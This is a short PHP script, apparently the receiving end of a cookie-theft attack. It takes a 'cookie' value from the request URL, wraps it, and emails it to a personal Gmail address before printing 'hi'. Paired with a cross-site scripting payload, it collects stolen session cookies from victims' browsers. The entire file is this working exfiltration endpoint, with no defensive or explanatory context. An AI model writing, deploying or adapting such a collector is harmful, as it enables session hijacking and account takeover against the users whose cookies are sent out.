<?php
    $message = wordwrap($_GET["cookie"], 69, "\r\n");
    mail( 'pie.tastes.good.314@gmail.com', 'cookie', $message);
    echo 'hi';
?>
